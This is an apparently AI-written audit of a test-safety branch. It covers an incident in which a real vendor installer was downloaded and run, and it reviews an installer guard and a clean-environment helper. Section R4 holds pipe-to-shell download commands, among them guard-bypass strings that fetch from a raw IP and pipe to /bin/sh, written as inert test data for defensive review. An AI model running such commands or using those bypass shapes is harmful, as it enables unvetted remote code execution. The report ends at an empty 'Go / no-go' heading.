# Independent VERIFY and safety audit: portable-validation-and-enrollment-regression (tasks 1–3)

Reviewer: fresh session, read-only apart from this file. Snapshot: branch `fix/portable-validation-baseline`, HEAD `6100696d8f0ca69c823eed851fae25d6a189b3cc`, tree `0dd35c332c25d2a3032d8423a56038bff2dc1e44`, 0 uncommitted entries before and after. Base `a194166017`. Tasks 4–5 are intentionally pending and are not assessed.

Toolchain used: Node v24.18.0 (explicit `PATH`), Git 2.56.0 (`/private/tmp/pi-dedup-git-toolchain/bin`), pnpm 9.15.4, `GIT_EDITOR` unset (it was `false` in the inherited shell), Python 3.9.6 (`/usr/bin/python3 -I`) and 3.15.2 (Homebrew).

## 1. Verdict

| Question | Answer |
|---|---|
| Feature-correct for tasks 1–3? | **Yes.** Zero production-code diff, original assertions preserved, focused suites green. |
| Safe to run the committed tests? | **Yes.** The network-installer guard is intact and every sandbox runner goes through it (§3). Running them left no residue (§2.5). |
| Safe to proceed to integration? | **Yes for the code, with conditions.** Condition 1: the owner records the incident disposition and authorizes cleanup (§2.6). Condition 2: verification doc §7.4 is corrected, because it understates the incident (W1). Fix W2 first if you want the guard hardened before more people run these tests. |

Counts: CRITICAL code findings 0. WARNING 3. SUGGESTION 4. One open incident (§2), which is a process finding, not a code defect.

## 2. Incident audit: probe ran the real Cursor installer

Treat this as an incident, not a no-op. Evidence below is metadata only. I did not execute, fetch or read downloaded content, and did not read credential contents.

### 2.1 What the preserved logs say

`/private/tmp/pv-logs` has no log of the probe itself. The only trace is verification doc §7.4 and the leftover directories. The probe script and its runner were deleted, so the exact `HOME`, `env` and command it used are **inferred from artifacts, not observed**.

### 2.2 `probe-RE6HFW`: the install completed and the downloaded CLI ran

Directory `/var/folders/0w/j69x0g910m182rtbp39_14dm0000gp/T/probe-RE6HFW`, 628 entries, about 638 MB, created 09:06.

1. Cursor agent release `2026.10.22-27dcf5f` is unpacked under `home/.local/share/cursor-agent/versions/` (`cursor-agent-sea` 153 MB, `cursor-agent-worker-sea` 167 MB, bundled `node_modules` with prebuilt `.node` binaries).
2. Two symlinks, `home/.local/bin/agent` and `home/.local/bin/cursor-agent`, point at the absolute path of that version's launcher inside the same fake `home`. No symlink leaves the probe directory.
3. The downloaded CLI **was executed**:
   - The version dir has a `.running` directory dated 09:07:07.
   - `rw/.paperclip-runtime/cursor/Library/Caches/cursor-compile-cache/v26.12.1-arm64-…` exists. It is a Node compile cache.
   - A Cursor session log reports `analytics.track {"eventName":"cli.launch"}`, PID 95377, start `2026-11-05T01:07:04Z` (09:07:04 local).
   - So the adapter's `execute()` ran, and it invoked the freshly downloaded binary.
4. Network egress to `cursor.com` happened. The release could not have arrived otherwise. Whether the `cli.launch` analytics event was transmitted cannot be established from disk.
5. The adapter spawns with `{ ...process.env, ...env }` (`packages/adapters/cursor-local/src/server/execute.ts:441`). The downloaded vendor binary therefore inherited the **whole environment of the process that ran the probe**. Whether that environment held tokens or API keys is unknown to me. This is the largest unbounded risk, and disk evidence cannot resolve it.

### 2.3 `probe-F4lJKQ`: an empty skeleton

Eight entries, 0 KB: `home/.local/share/cursor-agent/versions/` (empty), `ws/`, `rw/`. No download landed there. Why is not recoverable: the installer may not have run, may have failed, or may have been blocked. Do not read this as "the guard worked".

### 2.4 Containment leak outside the two directories

`/var/folders/0w/j69x0g910m182rtbp39_14dm0000gp/T/cursor-agent-logs-502/` is the **real** `$TMPDIR`, not the fake home. It holds a 1869-byte `session-2026-11-05T01-07-04-824Z-95377-1.log` and a `latest.log` symlink. mtime 09:07:04. The log names only paths inside `probe-RE6HFW` (ripgrep and sandbox binary locations, stack frames). I redacted nothing because it contained no credential-looking values. This shows the downloaded CLI wrote outside the probe's fake `HOME`.

### 2.5 Real-HOME and process checks (metadata only)

| Check | Result |
|---|---|
| `~/.local/share/cursor-agent`, `~/.local/bin/agent`, `~/.local/bin/cursor-agent`, `~/.cursor`, `~/Library/Caches/cursor*`, `~/Library/Application Support/Cursor*` | all absent |
| `~/.zshrc`, `.zprofile`, `.zshenv`, `.bashrc` mtimes | 11-04 23:08, 11-02, 11-03, 10-30: all **before** the incident window |
| `~/Library/LaunchAgents` mtime | 11-04 09:51, before the window |
| Home files modified 09:05–09:12 (depth ≤ 4, excluding Library) | only unrelated tools (herdr, browser-harness, hermes, claude); nothing Cursor-related |
| `~/Library` modified 09:05:30–09:08:30 (depth ≤ 3) | only macOS system files (Preferences, Assistant, Trial, …); nothing Cursor-related |
| `~/.local/bin` directory mtime | `09:29:46`, **after** the incident. No entry in it carries that time, so it was a transient add/remove. It coincides with the dispatcher process `agy` (PID 6032, start 09:29:45). I cannot attribute it, and it contains no Cursor files. |
| Live processes | `ps` and `lsof` show **no** process with args, cwd or open files under either exact probe directory. PID 95377 is gone. The one `ps` hit for "cursor-agent" is the dispatcher `agy` (PID 6032), whose command line contains this task text. It is unrelated, and I stopped nothing. |
| Fake-home install artifacts | the fake home holds only `.local/…`. There is no `.zshrc`, `.bashrc` or `.profile` inside it, so the installer did not write shell-profile edits there. |

After I ran the committed Cursor suite, `cursor-agent-logs-502` kept mtime 09:07:04. The committed tests never launched a downloaded binary.

### 2.6 What this supports, and what it cannot establish

Supports: all install output landed under the fake `HOME` (consistent with the installer honoring `$HOME`). No Cursor artifact or shell-rc change exists in the real HOME. Nothing is running.

Cannot establish:

- no pre-incident baseline of the real HOME, so "nothing changed" rests on mtime windows over bounded depth;
- no check of Keychain, launchd state, `defaults` domains, quarantine databases, or other users' paths;
- the installer script and its network traffic were not preserved, so I cannot prove it uses only `$HOME`;
- whether `cli.launch` analytics left the machine;
- what environment variables the downloaded binary saw (§2.2 item 5).

Do not claim "no real-HOME impact" more strongly than: *no artifact or rc/launch-agent change was found in the real HOME, but a binary downloaded from the network ran with the parent's inherited environment and wrote one log into the real `$TMPDIR`.*

### 2.7 Cleanup that needs owner authorization (not performed)

Deletion was blocked by the safety hook and I did not work around it. Inert items left in place:

1. `/var/folders/0w/j69x0g910m182rtbp39_14dm0000gp/T/probe-RE6HFW` (about 638 MB)
2. `/var/folders/0w/j69x0g910m182rtbp39_14dm0000gp/T/probe-F4lJKQ` (empty tree)
3. `/var/folders/0w/j69x0g910m182rtbp39_14dm0000gp/T/cursor-agent-logs-502` (log plus symlink)

The owner should also decide whether any secret present in the probe's inherited environment needs rotation.

## 3. Installer guard and test safety

Checked before running anything.

| Check | Evidence | Result |
|---|---|---|
| Guard exists on master | `git show a194166017:…/cursor-local-execute.test.ts` line 106 | pre-existing |
| Guard preserved | HEAD `cursor-local-execute.test.ts:125` throws `Sandbox fixture did not discover its preinstalled Cursor CLI` when any arg contains `curl https://cursor.com/install` | intact |
| Guard matches the real invocation | `execution-target.ts:818-823` runs `sh` with `shellCommandArgs(SANDBOX_INSTALL_COMMAND)`; the constant is `curl https://cursor.com/install -fsS \| bash` (`packages/adapters/cursor-local/src/index.ts:11`) | matches |
| Every sandbox runner is guarded | `createLocalSandboxRunner()` is the only runner source (lines 406, 473, 515); the negative cases wrap it and call `runner.execute` | no unguarded runner |
| Negative cases would notice a missing guard | both assert rejection matching `/did not discover/`, assert the installer was attempted, and assert no `cursor-agent` command ran | sound |
| Local-command cases | no remote target, so no install command runs | no install path |

Conclusion: no network fallback is reachable from the committed ordinary or negative tests while the constant text and the substring guard stay in sync. I judged them safe and ran them.

## 4. Findings

### WARNING

**W1. Verification doc §7.4 understates the incident.**
It says writes were "only" in the probe's fake HOME and that no cursor process remains. The audit shows a completed install, execution of the downloaded CLI, one log in the real `$TMPDIR`, and inherited-environment exposure (§2). *Fix:* amend §7.4 to state these facts and the open questions (§2.6). The doc is the PR evidence.

**W2. The guard is fail-open on drift.**
`cursor-local-execute.test.ts:125` matches a copied literal. If `SANDBOX_INSTALL_COMMAND` changes, or the installer arrives via `stdin`, another command name, or an `http://` URL, the guard stops matching and the next run would again download and execute a real CLI (with a faked HOME but real network and real `$TMPDIR`). *Fix:* build the match from the imported `SANDBOX_INSTALL_COMMAND`, additionally deny `/cursor\.com\/install/` and `curl|wget` across `command`, `args` and `stdin`, and fail closed on any unrecognized install attempt.

**W3. The diagnosis is verified on one Node build.**
Evidence supports Node v24.18.0 (undici 7.28.0) only. CI floats `node-version: 24`. The doc already says this; no code change needed. It remains a residual risk, not a defect. Related check: the helper pumps only timers due now and never moves `Date`, which the third `fake-clock-io` case and the M1/M2 mutations exercise.

### SUGGESTION

1. **Preflight "read-only" is not quite literal.** `scripts/validation-preflight.mjs` runs `git status --porcelain` in the repo, which can refresh `.git/index`. Set `GIT_OPTIONAL_LOCKS=0` on that call. The test "changes nothing on disk" checks only a temp root, not the repo.
2. **Preflight does not guard pnpm against Corepack.** The root `packageManager` is `pnpm@9.15.4`. If `pnpm` resolves to a Corepack shim, `pnpm --version` could download a pnpm. Rust is protected with `RUSTUP_AUTO_INSTALL=0`; set `COREPACK_ENABLE_NETWORK=0` for the pnpm probe in the same spirit.
3. **Cursor local cases still fall back to host Node.** `fixtureRuntimeEnv()` prepends `runtime-bin` but appends `process.env.PATH`, so the in-test proof of independence is weaker than the `env -i` run cited in doc §5. Acceptable; consider asserting `PATH` with only the fixture directory plus system paths.
4. **`mkdtempSync` failure is uncaught.** A read-only `TMPDIR` crashes the preflight instead of reporting a failed check.

## 5. Scenario and requirement mapping (tasks 1–3 only)

| Requirement / scenario | Evidence | Status |
|---|---|---|
| Enrollment activates the existing worker; same worker from unenrolled state | `github-connection-enrollment-work.test.ts` unchanged except import and `observe()`; passed 1/1 in my run | ✓ |
| Validation or persistence failure | assertion set unchanged; `expect(` count 27 → 27, 0 removed | ✓ |
| Identity replacement and removal | M4b mutation log (`mutation/M4b…`) shows the removal assertion fails when the service keeps the old connector | ✓ (not re-mutated by me) |
| Quiet period (25 min) | assertions and `quiet()` untouched | ✓ |
| Faithful asynchronous lifecycle under delay or clock interleaving | `fake-clock-io.test.ts` 3/3; diag logs: `baseline-final.log:45` shows `setTimeout` `ms:0` from `scheduleIdleSocketValidation`; `realtimers.log` shows lease at +11571 ms and ack at +11604 ms; `pump.log` and `connclose.log` each end `1 passed` | ✓ (cause proven for Node 24.18.0) |
| Self-contained command fixtures; Node only inside a version manager | Cursor suite 7/7; `runtime` symlink inside each fake home | ✓ |
| Fixture command truly missing | the two negative cases (§3) | ✓ (proves "installer refused", not a shell `command not found`) |
| Portable mock resource lifecycle; Python 3.9 and newer | `/usr/bin/python3 -I` 3.9.6: `Ran 64 tests … OK`; Python 3.15.2: `Ran 64 tests … OK`; vitest wrapper 19/19 | ✓ |
| Read-only prerequisite check: insufficient conditions; isolated tool paths | `node --test scripts/validation-preflight.test.mjs` 8/8; live run on this snapshot printed `preflight passed` with git 2.56.0 and Python 3.15.2 | ✓ |
| Complete and auditable acceptance coverage (official groups; failure then fix; prior regression still failing) | belongs to tasks 4–5 | not assessed |

## 6. Production diff and assertion integrity

- `git diff --name-only a194166017 HEAD` outside `openspec/` and `doc/`: `package.json`, `scripts/validation-preflight.{mjs,test.mjs}`, three server test files, one test helper, one Python fixture. Zero files under `packages/`, `cli/`, `ui/`, `server/src/services/`, `server/src/routes/`, or `pnpm-lock.yaml`. So `defaultPathForPlatform`, `client.py`, v1–v9 assets and byte pins are untouched, and no dependency was added.
- `package.json` adds only two scripts: `preflight:validation` and `test:validation-preflight`.
- Cursor: `expect(` count 25 → 31, zero removed; the one modified existing line is `env: { HOME: configuredHome }` → `env: { ...runtimeEnv, HOME: configuredHome }`. Command, PATH-prefix and prompt assertions are intact.
- Muse: the `assertEqual(str(raised.exception), …)` assertion is unchanged, moved into `try/finally` with a real `io.BytesIO` body, plus a new `assertTrue(body.closed)`. The 9 published-version byte-pin tests passed.
- Enrollment: no timeout was lengthened, no scheduler or service file changed, no authentication was loosened.

## 7. Independent runs (this worktree, explicit Node 24)

| Command | Result |
|---|---|
| `pnpm run test:validation-preflight` | `tests 8, pass 8, fail 0` |
| `node scripts/validation-preflight.mjs --stage blockers` | exit 0, `preflight passed` (rust SKIP, not required for this stage) |
| `cd server && pnpm exec vitest run cursor-local-execute muse-client-contract fake-clock-io` | `Test Files 3 passed (3)`, `Tests 29 passed (29)` (Cursor 7, Muse 19, helper 3) |
| `… vitest run github-connection-enrollment-work.test.ts` | `Test Files 1 passed (1)`, `Tests 1 passed (1)` |
| `/usr/bin/python3 -I … muse-client-contract.py …/v9/client.py`; same with Homebrew Python | both `Ran 64 tests … OK` |

Not run, by instruction: broad or full suites, typecheck, build, mutations (I did not insert probe tests). Cross-check: 7 + 19 + 3 + 1 = 30 vitest tests across four files, equal to the doc's `Tests 30 passed (30)`.

Source hashes: SHA-256 of the eight changed source files (`scripts/validation-preflight.mjs` `e98243e2…`, cursor test `af0db9a7…`, `fake-clock-io.ts` `056a81ad…`, Muse fixture `553845ea…`, enrollment test `2f88a340…`, `package.json` `ca8fddb8…`, and the other two) were identical before and after the runs. `git status` was clean before; after, the only change is this file. Hash list: `/tmp/pv-review-before.txt`.

## 8. Limitations

- The incident reconstruction is from disk artifacts alone; see §2.6.
- Tasks 4–5 and the official group inventory were not evaluated.
- The untracked parent copy of the OpenSpec change in `/Volumes/AI/projects/paprerclip-v2` has its checkboxes unchecked, while this worktree's `tasks.md` marks 1.1–3.3 done. Reconcile that in task 4.1 before merging.

---

# Re-review addendum (HEAD `e87a10b5c`)

Everything above this line is the original report, unchanged (SHA-256 of the original file before this append: `efd727cb40b399dedbe2af8432805c1847093c0a03dbf422cb236c1b54e95117`, 162 lines). This addendum is the only thing added. The reviewer is a fresh session; the only repository edit is this file.

## R1. Snapshot and scope

| Item | Value |
|---|---|
| Branch / HEAD | `fix/portable-validation-baseline` / `e87a10b5c3825085acb204623592baca8366f511` |
| Tree | `fc3bb6bf07ebb7cc9b3f37d367b36c3bdaa1ebc3`; `git status` before and after: only this file untracked; stash list 0 before and after |
| Reviewed range | `6100696d8..e87a10b5c` (5 commits: `71fa9e2ed` amendments, `6e2e723c2` guard, `05e59f283` preflight, `3e440ea68` clean-env helper, `e87a10b5c` docs) |
| Production diff in that range | none (`packages/ cli/ ui/ server/src/services/ server/src/routes/ pnpm-lock.yaml`: empty) |
| Toolchain | Node v24.18.0 only (explicit limit, see R8), Git 2.56.0 (`/private/tmp/pi-dedup-git-toolchain/bin`), pnpm 9.15.4 from an isolated Corepack cache, `/usr/bin/python3` 3.9.6, Homebrew python3 3.15.2 |
| Not done, by instruction | no broad or full suites, no typecheck/build, no downloaded binary executed, no network tool or installer, no real-HOME change, no deletion of incident paths, no hook bypass, no secret value read |

Parent amendments are byte-identical to the author copy: `design.md` `69547cab…`, `specs/isolated-validation/spec.md` `a0689405…`, and `tasks.md` equals the author hash `e3e12516…` once the `[x]` marks are normalized back to `[ ]`. At HEAD, tasks 2.6 and 2.7 are checked by the author and 2.5 is unchecked.

## R2. Verdict

| Question | Answer |
|---|---|
| W1 corrected accurately? | **Yes.** Not an all-clear (R3). |
| W2 fixed? | **Yes for the failure class W2 named** (literal drift, stdin, other command names, `http://`, `wget`). **Not fully fail-closed for path-shaped commands** (R-W1) and **two other runners remain fail-open** (R-W2). |
| Preflight read-only boundary (2.6)? | **Yes**, independently reproduced (R5). |
| Secret-free helper (2.7)? | **Yes**, within the stated non-sandbox scope (R6). |
| Safe to integrate tasks 1–3 plus 2.5–2.7? | **GO for code integration, with conditions** (R9). Full acceptance (tasks 4–5) is not certified. |

Counts: **CRITICAL 0. WARNING 2. SUGGESTION 6.**

## R3. W1: incident correction (verification doc §7.4, §10.1; design.md; PR body draft)

I compared every claim in §10.1 with the original §2. Each one matches the original or is marked as a relayed fact, not re-verified.

| Required element | Where it is stated | Result |
|---|---|---|
| A real third-party binary was downloaded and **executed** (Cursor `2026.10.22-27dcf5f`, `.running`, compile cache, `cli.launch` log, PID 95377) | §10.1 items 1–3 | accurate |
| Inherited environment: `{ ...process.env, ...env }`, whole parent environment, contents unknown | §10.1 item 5 and the "cannot prove" list | accurate; kept as the largest unbounded risk |
| Log in the **real** `$TMPDIR` (`cursor-agent-logs-502`, 1869 bytes plus `latest.log`) | §10.1 item 4 | accurate; "not only the fake HOME" is stated |
| Uncertainty list (secrets in env, analytics egress, installer not preserved, no baseline, Keychain/launchd/`defaults`/quarantine unchecked) | §10.1 | accurate; ends with "cannot claim exfiltration excluded nor 'no impact'" |
| `probe-F4lJKQ` is not evidence the guard worked | §10.1 | accurate |
| The old §7.4 text stays, labelled wrong, with a pointer | §7.4 item 4 | acceptable: quoted as history, not silently rewritten |
| Owner decisions (cleanup authorization, rotation) not taken | §10.1, design.md | accurate; nothing deleted, nothing rotated |

The same wording appears in `design.md` ("cannot guarantee no credential exposure") and in the local PR body draft (`pr-body.after.md`). I did not read the live GitHub PR body (that needs the network).

**Residual incident state, measured now (metadata only, before and after my runs: identical):**

| Path | State |
|---|---|
| `…/T/probe-RE6HFW`, `…/T/probe-F4lJKQ`, `…/T/cursor-agent-logs-502` | all three still present; mtimes `09:06:47`, `09:07:02`, `09:07:04`, unchanged by my runs |
| `~/.cursor`, `~/.local/share/cursor-agent` | absent |
| `~/.local/bin` | contains no Cursor entry. Its directory mtime is now `10:07:23`, which equals the start of the dispatcher process `agy` (PID 27006), as the earlier `09:29:46` equalled PID 6032's start. That is a second coincidence with the launcher, which makes attribution to the launcher more plausible. It does **not** prove it |
| processes | none matching `cursor` other than the dispatcher |
| eight `paperclip-clean-env-*` skeletons from mutation MC6 | still present, unchanged (`0A9bKn 90ONAU MWdUBJ QFWPjY U8Fs8R kQvXLq tHFExA ylfgFd`); my runs added none |

Limits stay as in the original §2.6. **The historical exposure is not fixed and not known to be absent.** Cleanup and any credential rotation remain the owner's decision. I did not execute, read or unpack anything in the three paths, except that a pure guard probe called `realpath` on one launcher path (R4, S1).

## R4. W2: installer guard (`server/src/__tests__/helpers/sandbox-install-guard.ts`)

**Order and coverage**

- `createGuardedSandboxRunner().execute` calls `inspectSandboxCall` first and throws before `backend(...)`. My mutation N8 (backend first) and N3 (verdict ignored) were caught.
- Every runner in `cursor-local-execute.test.ts` comes from `createLocalSandboxRunner()` (lines 378, 445, 487, 499 wraps the guarded runner). The `expect(` count is 31 at `6100696d8` and at HEAD.
- Inspected slots: `command`, each `args` entry, shell script text, and `stdin`. Bare `sh`, `sh -s`, `bash -`, `-lc`, extra arguments after `-c <script>`, and stdin to a shell are refused. Stdin is accepted only for `base64 -d >> <file>` or for a fixture binary (as its prompt).

**Inert variants I ran against the pure function (nothing executed)**: `bash -lc …|bash`, `zsh -c`, `/bin/sh -c "wget -qO- cursor.com/i|sh"`, `sh -c true extra`, `node -e fetch(…)`, `/usr/bin/perl`, `curl 93.184.216.34/x` as the command, `/usr/bin/env -S`, `| xargs`, `bunx cursor-agent` (unknown word), `open https://…`, `$'\x63url'`, `/USR/BIN/CURL`, `ssh`. **All refused**, with reasons naming the layer.

**Can the unit tests or mutations launch the network? No.** The unit file passes inert strings to the pure function or to a recording sentinel backend. Its only real child process is `sh -c printf …` through the secretless backend (local). The worker's nine mutation logs (`mut-MG1…MG9`) each ran only `sandbox-install-guard.test.ts`. I ran twelve of my own mutations on a **copy outside the worktree** (`/tmp/pv-rereview/mut1`, which holds only the guard and the unit file), so the worktree stayed untouched.

**Real command, PATH and assertions are still tested**: Cursor 7/7 through the clean env; the local-command cases and PATH-prefix assertions are untouched (diff removes only the inline runner and its import).

**My independent mutations (unit file only; baseline 57/57)**

| Mutation | Result |
|---|---|
| N3 verdict ignored; N7 stdin rule off; N8 backend before guard; N10 temp-root check off; N11 unknown word allowed | caught (1, 1, 2, 3, 1 failures) |
| N1 command scan off; N2 adapter-constant match off; N4 URL-scheme pattern off; N5 `curl|wget` unlisted; N6 extra `sh -c` args allowed; N9 interpreter set emptied; N12 backticks allowed | **survived (57/57)** |

Each survivor is shadowed by another layer, so I could not turn any of them into a hole. They show that those layers are not pinned by a test of their own (S2).

### R-W1 (WARNING). "Fail-closed on any unknown word" does not hold for path-shaped commands

`replacePaths` blanks every token that contains `/` before the bare-interpreter and vocabulary checks. Deny patterns still run on the raw text, so a command that *names* `curl`, `wget`, etc. is caught. A command that is only a path is not vetted. These inert strings were **allowed**:

1. `mkdir -p /tmp/x && /bin/sh /tmp/x/script-from-elsewhere` (the test for the bare form `sh <file>` is refused; the absolute form is not)
2. `cat /tmp/x/payload | /bin/sh`
3. `/usr/bin/c?rl 93.184.216.34/x | /bin/sh` (glob-obscured name, host as digits)
4. `./dl 93.184.216.34/x`
5. `/usr/bin/env /tmp/x/dl`

Not reachable from the adapter's current script shapes, and the stated threat is an accidental install, not an adversary. But verification doc §10.2 and `doc/DEVELOPING.md` say an unknown install form "fails closed", and this is a hole in that sentence. *Fix (small):* after blanking, check the first word of each simple command, and refuse path commands that are not under the test's own temp root or a short named list (`tar`, `find`, `mv`, …); or reword both statements to "named tools and unrecognized bare words are refused; path commands are not vetted".

### R-W2 (WARNING). Two other runners remain fail-open on drift (outside the new guard)

`packages/adapters/cursor-local/src/server/execute.test.ts:117` and `…/test.test.ts:52` replace the install command with a local simulation only when `args[1] === SANDBOX_INSTALL_COMMAND` holds exactly. Otherwise the call goes straight to `runChildProcess` with the host environment merged in. That is the same class as the original W2: if the constant, the argument position or the script shape changes, the next run downloads and executes the real installer. These files are upstream, unchanged by this work, and they run in any full suite (task 4). I did not run them (broad). *Decision before task 4:* wrap both with the guard (or add a pre-execution refusal) or record explicit acceptance.

## R5. Preflight (task 2.6; suggestions 1, 2, 4 of the original report)

| Item | Independent evidence | Result |
|---|---|---|
| `GIT_OPTIONAL_LOCKS=0` on every child, even if the caller sets 1 | unit test passes; **stale-index experiment on a throwaway local clone** (not the worktree): index mtime `1793844926` before and after the preflight; an ordinary `git status` right after moved it to `1793844928` | holds |
| Corepack network off | `COREPACK_ENABLE_NETWORK=0` is checked in Corepack 0.35.0's `fetch()` and registry lookup before any request; a clean-env `pnpm --version` with an empty cache printed `Corepack is about to download …` then `Network access disabled by the environment`, exit 1 | holds; nothing downloaded |
| Temp creation failure | `TMPDIR=<regular file>`: exit 1, stderr 0 bytes, JSON `ok:false`, `failed:["git-rev-list-stdin-not"]`, detail `cannot create a private probe directory under …: ENOTDIR; set TMPDIR to a writable directory` | holds; machine-readable |
| Writes or installs | `mkdtempSync` is the only temp creator, removed in `finally` | none beyond the probe directory |

## R6. Secret-free helper (`scripts/validation-clean-env.mjs`, task 2.7)

I started the helper from a parent shell that held **synthetic** sentinels only (`PV_FAKE_PROVIDER_API_KEY`, `OPENAI_API_KEY`, `PAPERCLIP_PV_SENTINEL_SECRET`, plus `NODE_OPTIONS=--require=<a preload that sets PV_PRELOAD_MARKER>`). I printed only the **child's** variable names.

| Check | Result |
|---|---|
| Child variable names | exactly the allowlist (16 names) plus macOS-injected `__CF_USER_TEXT_ENCODING` |
| Sentinels, `NODE_OPTIONS`, preload marker | all absent; a text search of the child's whole environment for the sentinel prefix found nothing |
| `HOME`, `PAPERCLIP_HOME`, `TMPDIR`, XDG, `COREPACK_HOME`, git config | siblings in one owned `paperclip-clean-env-*` root; `os.homedir()` equals `HOME`; `git config --global user.email` is the synthetic `validation@paperclip.invalid` |
| `PATH` | `…/node/v24.18.0/bin:<declared --bin>:/usr/bin:/bin:/usr/sbin:/sbin`. The Node directory holds only `corepack node npm npx pnpm pnpx yarn yarnpkg` |
| Declared tool and cache paths usable | Git 2.56.0 from `--bin`; pnpm 9.15.4 from the declared `COREPACK_HOME` cache |
| `--set`/`--pass` | refuses credential-like names, `NODE_OPTIONS`, `DYLD_*`, `DATABASE_URL`; unit test 7/7 |
| No global change | `--describe` prints the plan and runs nothing; no install; parent environment untouched; cleanup removes the owned root (zero new skeletons after my runs) |
| OS-sandbox claim | none: the file header, `doc/DEVELOPING.md` and verification doc §10.4 all say it is environment hygiene, not a sandbox |

The name-based refusal covers the common credential spellings but is not a value scanner (S3).

## R7. Independent runs through the clean-env recipe (local worktree, sentinels set in the parent)

`CLEAN = node scripts/validation-clean-env.mjs --bin /private/tmp/pi-dedup-git-toolchain/bin --set COREPACK_HOME=/private/tmp/pv-clean-tools/corepack`. Logs: `/tmp/pv-rereview/{A…G}*.log`.

| # | Command (each `$CLEAN -- …`) | Exit | Result |
|---|---|---|---|
| A | `pnpm run test:validation-preflight` | 0 | tests 12, pass 12, fail 0 |
| B | `pnpm run test:validation-clean-env` | 0 | tests 7, pass 7, fail 0 |
| C | `node scripts/validation-preflight.mjs --stage blockers` | 0 | `preflight passed` (node 24.18.0, pnpm 9.15.4, git 2.56.0 + `--not` probe, python 3.9.6; rust SKIP, not needed for this stage) |
| D | `/usr/bin/python3 -I …/muse-client-contract.py server/src/services/scripts/v9/client.py`; same with Homebrew 3.15.2 | 0 / 0 | `Ran 64 tests … OK` both |
| E | `cd server && pnpm exec vitest run cursor-local-execute sandbox-install-guard muse-client-contract fake-clock-io github-connection-enrollment-work` | 0 | `Test Files 5 passed (5)`, `Tests 87 passed (87)` (7 + 57 + 19 + 3 + 1, no skips) |
| F | preflight in a throwaway clone with a stale index | 0 | index unchanged (R5) |
| G | `TMPDIR=<file> node scripts/validation-preflight.mjs --stage blockers --json` | 1 | structured failure (R5) |

My first D attempt used a wrong path for `client.py` (my error); it failed on argument parsing before testing anything, and the passing runs above use the correct path. Not run: Cursor adapter package tests, typecheck, build, mutations of the real worktree files.

## R8. Hashes and state, before and after (SHA-256; identical)

```
cd672c38c19cc62863ff0187ba07de94002317681bf42fe19a76feb934f61dac  scripts/validation-preflight.mjs
cdb268394f4fd8b5ee257b47508c658b09db9f2c61213f9a369a294fc32780b8  scripts/validation-preflight.test.mjs
233d12abe0afae127475e00816b694388552c985b4821fc41fdf808bddc4a465  scripts/validation-clean-env.mjs
dc813d2459091e413bcbac6292b7bee53cb82ec8edc391691a76bf1ea6b2612b  scripts/validation-clean-env.test.mjs
9b3ad35e85ff167c23ef3d4543406aadcb189c14877e76c0fc859f084051d425  server/src/__tests__/helpers/sandbox-install-guard.ts
c309cb0ae18d385314492aba4d486117660d7d45abb0c3a7f590de22f4377b68  server/src/__tests__/sandbox-install-guard.test.ts
c7f8bd3f706801c4e8e7f122a06d9eb89feb97af770643852565ba7524cb0c20  server/src/__tests__/cursor-local-execute.test.ts
056a81ad26f9656a9e509dcd4ccae699b8715815a16a40d091f8bcd82099b782  server/src/__tests__/helpers/fake-clock-io.ts
0b0acd52fec887777ee980c6a889d296f084624d4d8e809b0e30cfb96822e1ae  server/src/__tests__/muse-client-contract.test.ts
553845ea66cb7071504a2b40798c2ef3c7162fe0dbe1158ea0fb35fb7fc5e0aa  server/src/__tests__/fixtures/muse-client-contract.py
2f88a340c25142185d0ee92a5c1bd3b3ec1deab9a690d21c2bbff0b47bb96add  server/src/__tests__/github-connection-enrollment-work.test.ts
a761315dc996ae8c333e62ce9947d300ea8f287754251bec2308192597172f44  doc/DEVELOPING.md
a0d5a5d50d52eaff9abcb0e347983cc090e00014d69e306feebce86947dd584c  package.json
69547cab64c8bcfbc2b5b106103b0c725355dafc59353d4e231535bf290d1033  openspec/…/design.md
7f3e1fac66570a81f31ea59910ef4d57a12641dcfca176b411fd238fb8937ab8  openspec/…/tasks.md
a0689405bd10e7c2ae6593d035dd8baf161f04c8ba513edc00b08d9ea7db2058  openspec/…/specs/isolated-validation/spec.md
```

These match verification doc §10.7 for the nine files it lists. Tools (unchanged): `node` v24.18.0 `ee6fb0e0…`, Git 2.56.0 `916479af…`, `/usr/bin/python3` `37c55f1f…`, Homebrew python3 `d775520d…`. The isolated pnpm cache files are unchanged. Lists: `/tmp/pv-rereview/{before,after}-{src,tools}.sha`, `before-state.txt`, `after-state.txt`.

**Limits.** Node: the enrollment diagnosis is verified on v24.18.0 / undici 7.28.0 only. That is an explicit documented limit (`doc/DEVELOPING.md`, verification doc §10.3), and I did not ask for a version matrix. Python 3.9.6 and 3.15.2 ran the Muse contract. The author's `…/pv-clean-tools` cache is a copy of a host Corepack cache that I did not rebuild.

## R9. Findings and go/no-go

### CRITICAL
None.

### WARNING
- **R-W1** Guard is not fail-closed for path-shaped commands (R4). Fix the check or correct the claim in §10.2 and `doc/DEVELOPING.md`.
- **R-W2** Two adapter-package runners remain fail-open on drift and run in the full suite (R4). Guard or explicitly accept before task 4.

### SUGGESTION
1. **S1.** The default executable root is all of `os.tmpdir()`, so the retained incident launcher `…/probe-RE6HFW/home/.local/bin/agent` counts as an allowed "fixture binary" (pure `realpath` probe, nothing run). Pass the test's own `mkdtemp` root (the option already exists); with a per-test root the same path is refused.
2. **S2.** Seven of my twelve single-layer mutations survived (N1, N2, N4, N5, N6, N9, N12). Add a test per layer, in particular for `sh -c <script> <extra>`.
3. **S3.** Clean-env limits to state in the docs: `HOME` does not stop tools that look up the home directory in the user database (for example `ssh` keys) or use the Keychain; the name filter does not inspect values (for example a proxy URL with credentials); `PATH` admits whatever sits beside the Node binary; `spawnSync` cannot clean up if the helper is killed by a signal, and a signalled child exits as 1.
4. **S4.** `buildSecretlessEnv` keeps every `PAPERCLIP_*` key. The adapter merges `process.env` into `input.env`, so in a non-clean run a host `PAPERCLIP_*SECRET*` or `*KEY*` value reaches the test-owned fake CLI (pure sentinel check). The clean-env recipe removes that; consider dropping credential-looking names.
5. **S5.** Housekeeping. Besides the author's eight MC6 skeletons and `/private/tmp/pv-clean-tools`, my review left `/tmp/pv-rereview` (about 791 MB: a throwaway local clone `idxclone`, the mutation copy `mut1`, logs, hash lists, a preload file). The safety hook forbids recursive deletion, so I left it; it holds no secrets.
6. **S6.** Task bookkeeping. 2.6 and 2.7 are already checked by the author; I reproduced both. For 2.5, the W1 half is confirmed. The W2 half is confirmed for the failure class W2 named, with R-W1 and R-W2 still open. The parent should check 2.5 only with those two recorded.

### Go / no-go

